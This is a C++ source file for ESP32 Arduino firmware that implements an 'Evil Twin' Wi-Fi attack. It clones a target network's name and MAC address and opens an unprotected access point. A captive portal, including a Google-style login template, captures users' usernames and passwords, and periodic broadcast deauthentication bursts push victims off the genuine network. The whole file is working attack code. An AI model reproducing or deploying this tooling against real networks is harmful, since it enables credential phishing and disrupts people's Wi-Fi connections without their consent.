#include "evil_twin.h"
#include "deauth.h"  // For unified deauth utilities
#include <cstring>
#include <cstdio>

#ifdef UNIT_TEST
static uint32_t evil_twin_mock_millis = 0;
static uint32_t millis() { return evil_twin_mock_millis; }
#else
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "core/event_bus.h"
#endif

namespace attack {

uint32_t EvilTwinStats::getDuration() const {
    if (startTime == 0) return 0;
    return millis() - startTime;
}

EvilTwin::EvilTwin() {
    // Set up credential callback for Arduino portal
    arduinoPortal_.onCredentialCaptured([this](const ap::ArduinoCapturedCredential& cred) {
        stats_.credentialsCaptured++;
        
        // Publish EventBus event
#ifndef UNIT_TEST
        adversary::EventData event(adversary::EventType::CREDENTIAL_CAPTURED);
        strncpy(event.payload.credential.ssid, targetSSID_, 32);
        strncpy(event.payload.credential.username, cred.username, 63);
        strncpy(event.payload.credential.password, cred.password, 63);
        adversary::EventBus::getInstance().publish(event);
#endif
    });
}

EvilTwin::~EvilTwin() {
    stop();
}

void EvilTwin::setTarget(const char* ssid, const uint8_t* bssid, uint8_t channel) {
    strncpy(targetSSID_, ssid, sizeof(targetSSID_) - 1);
    targetSSID_[sizeof(targetSSID_) - 1] = '\0';
    
    targetChannel_ = channel;
    
    if (bssid) {
        memcpy(targetBSSID_, bssid, 6);
        hasTargetBSSID_ = true;
    } else {
        memset(targetBSSID_, 0, 6);
        hasTargetBSSID_ = false;
    }
}

void EvilTwin::setDeauthEnabled(bool enable, uint32_t intervalMs) {
    deauthEnabled_ = enable;
    deauthIntervalMs_ = intervalMs;
}

void EvilTwin::setPortalConfig(const ap::CaptivePortalConfig& config) {
    portalConfig_ = config;
}

bool EvilTwin::start() {
    if (state_ == EvilTwinState::RUNNING) {
        return true;
    }
    
#ifndef UNIT_TEST
    Serial.printf("[EvilTwin] Starting attack on SSID: %s, CH: %d\\n", 
                  targetSSID_, targetChannel_);
#endif
    
    state_ = EvilTwinState::STARTING;
    
    // Reset stats
    memset(&stats_, 0, sizeof(stats_));
    stats_.startTime = millis();
    
#ifndef UNIT_TEST
    // Save STA credentials before mode switch (mode switch may disconnect)
    String savedSSID = WiFi.SSID();
    String savedPSK = WiFi.psk();
    bool wasConnected = WiFi.isConnected();
    
    if (wasConnected) {
        Serial.printf("[EvilTwin] Saving STA connection to %s for reconnect\n", savedSSID.c_str());
    }
    
    // Switch to AP+STA mode
    if (!WiFi.mode(WIFI_AP_STA)) {
        Serial.println("[EvilTwin] ERROR: Failed to set AP+STA mode!");
        state_ = EvilTwinState::ERROR;
        return false;
    }
    delay(200);  // Give mode switch time to complete
    
    // Reconnect STA if we were connected
    if (wasConnected && savedSSID.length() > 0) {
        Serial.printf("[EvilTwin] Reconnecting to %s...\n", savedSSID.c_str());
        WiFi.begin(savedSSID.c_str(), savedPSK.c_str());
        
        // Wait for reconnection with timeout (required for traffic proxy)
        uint32_t startMs = millis();
        while (!WiFi.isConnected() && (millis() - startMs) < 5000) {
            delay(100);
        }
        
        if (WiFi.isConnected()) {
            Serial.printf("[EvilTwin] STA reconnected! IP: %s\n", WiFi.localIP().toString().c_str());
        } else {
            Serial.println("[EvilTwin] WARNING: STA reconnection timeout - traffic proxy may not work");
        }
    }
    
    // Optionally set custom BSSID before starting AP
    if (hasTargetBSSID_) {
        Serial.printf("[EvilTwin] Setting custom BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      targetBSSID_[0], targetBSSID_[1], targetBSSID_[2],
                      targetBSSID_[3], targetBSSID_[4], targetBSSID_[5]);
        esp_wifi_set_mac(WIFI_IF_AP, targetBSSID_);
    }
    
    // Start soft AP - open network (no password)
    Serial.printf("[EvilTwin] Creating AP: %s on channel %d\n", targetSSID_, targetChannel_);
    bool apStarted = WiFi.softAP(targetSSID_, nullptr, targetChannel_, 0, 8);
    
    if (!apStarted) {
        Serial.println("[EvilTwin] ERROR: Failed to start SoftAP!");
        state_ = EvilTwinState::ERROR;
        return false;
    }
    
    IPAddress apIP = WiFi.softAPIP();
    Serial.printf("[EvilTwin] AP started! IP: %s\n", apIP.toString().c_str());
    
    // Wait for AP to fully initialize before starting DNS (like Bruce does)
    // The WiFi stack needs time to be ready for DNS binding
    Serial.println("[EvilTwin] Waiting for AP to stabilize...");
    uint32_t waitStart = millis();
    while (millis() - waitStart < 2000) {
        yield();  // Allow background tasks to run
    }
    
    // Auto-configure portal title
    char portalTitle[64];
    if (portalConfig_.customTitle[0] != '\0') {
        strncpy(portalTitle, portalConfig_.customTitle, sizeof(portalTitle) - 1);
    } else {
        snprintf(portalTitle, sizeof(portalTitle), "%s - Sign In", targetSSID_);
    }
    
    // Start Arduino-based captive portal (includes DNS server) if enabled
    if (portalConfig_.enableCaptivePortal) {
        if (!arduinoPortal_.start(portalTitle)) {
            Serial.println("[EvilTwin] ERROR: Failed to start captive portal!");
            WiFi.softAPdisconnect(true);
            state_ = EvilTwinState::ERROR;
            return false;
        }
        arduinoPortal_.setSSID(targetSSID_);  // Set SSID for credential filename
        arduinoPortal_.setPageType(portalConfig_.pageType);  // Set portal template (Generic/Google)
        Serial.printf("[EvilTwin] Captive portal started with pageType: %d\n", 
                      static_cast<int>(portalConfig_.pageType));
    } else {
        Serial.println("[EvilTwin] Traffic routing mode - captive portal disabled");
    }
    
    Serial.println("[EvilTwin] Attack running!");
#endif

    state_ = EvilTwinState::RUNNING;
    lastDeauthTime_ = 0;
    
    return true;
}

void EvilTwin::stop() {
    if (state_ == EvilTwinState::IDLE) {
        return;
    }
    
#ifndef UNIT_TEST
    Serial.println("[EvilTwin] Stopping...");
#endif
    
    state_ = EvilTwinState::STOPPING;
    
#ifndef UNIT_TEST
    // Stop captive portal (DNS + HTTP)
    arduinoPortal_.stop();
    
    // Stop WiFi AP
    WiFi.softAPdisconnect(true);
    
    // Release WiFi memory for Menu/next module
    WiFi.mode(WIFI_OFF);
    delay(100);  // Give time for mode switch
    
    Serial.println("[EvilTwin] Stopped");
#endif
    
    state_ = EvilTwinState::IDLE;
}

void EvilTwin::update() {
    if (state_ != EvilTwinState::RUNNING) {
        return;
    }
    
#ifndef UNIT_TEST
    uint32_t now = millis();
    
    // Process DNS and HTTP requests
    arduinoPortal_.handleRequests();
    
    // Update client count
    stats_.clientsConnected = WiFi.softAPgetStationNum();
    
    // Track total connections
    static uint8_t lastClientCount = 0;
    if (stats_.clientsConnected > lastClientCount) {
        stats_.totalConnections += (stats_.clientsConnected - lastClientCount);
        
        // Publish EventBus event for semantic notification
        adversary::EventData event(adversary::EventType::CLIENT_CONNECTED);
        strncpy(event.payload.network.ssid, targetSSID_, 32);
        adversary::EventBus::getInstance().publish(event);
    }
    lastClientCount = stats_.clientsConnected;
    
    // Update stats from portal
    stats_.dnsQueries = arduinoPortal_.getDnsQueryCount();
    stats_.httpRequests = arduinoPortal_.getRequestCount();
    
    // Periodic deauthentication (only when no clients connected to our AP)
    if (deauthEnabled_ && stats_.clientsConnected == 0 &&
        now - lastDeauthTime_ >= deauthIntervalMs_) {
        sendDeauthBurst();
        lastDeauthTime_ = now;
    }
#endif
}

void EvilTwin::sendDeauthBurst() {
#ifndef UNIT_TEST
    // Use unified deauth utility - sends 3 broadcast deauths + disassocs
    uint16_t sent = adversary::DeauthAttack::sendTargetedBurst(
        targetBSSID_,
        nullptr,  // No specific clients - broadcast only
        0,        // clientCount = 0
        3,        // burstCount
        true      // alsoDisassoc
    );
    stats_.deauthsSent += sent;
    Serial.println("[EvilTwin] Sent periodic deauth burst");
#else
    stats_.deauthsSent += 6;
#endif
}

void EvilTwin::updateStats() {
#ifndef UNIT_TEST
    stats_.httpRequests = arduinoPortal_.getRequestCount();
    stats_.credentialsCaptured = arduinoPortal_.getCredentialCount();
    stats_.clientsConnected = WiFi.softAPgetStationNum();
#endif
}

const std::vector<ap::CapturedCredential>& EvilTwin::getCredentials() const {
    // Convert Arduino portal credentials to our format
    static std::vector<ap::CapturedCredential> convertedCreds;
    convertedCreds.clear();
    
    const auto& arduinoCreds = arduinoPortal_.getCredentials();
    for (const auto& cred : arduinoCreds) {
        ap::CapturedCredential converted;
        strncpy(converted.username, cred.username, sizeof(converted.username) - 1);
        strncpy(converted.password, cred.password, sizeof(converted.password) - 1);
        strncpy(converted.clientIP, cred.clientIP, sizeof(converted.clientIP) - 1);
        converted.timestamp = cred.timestamp;
        convertedCreds.push_back(converted);
    }
    
    return convertedCreds;
}

uint8_t EvilTwin::getClients(ap::APClient* clients, uint8_t maxClients) const {
#ifndef UNIT_TEST
    wifi_sta_list_t staList;
    if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK) {
        uint8_t count = (staList.num < maxClients) ? staList.num : maxClients;
        for (uint8_t i = 0; i < count; i++) {
            memcpy(clients[i].mac, staList.sta[i].mac, 6);
            clients[i].rssi = staList.sta[i].rssi;
        }
        return count;
    }
#endif
    (void)clients;
    (void)maxClients;
    return 0;
}

} // namespace attack
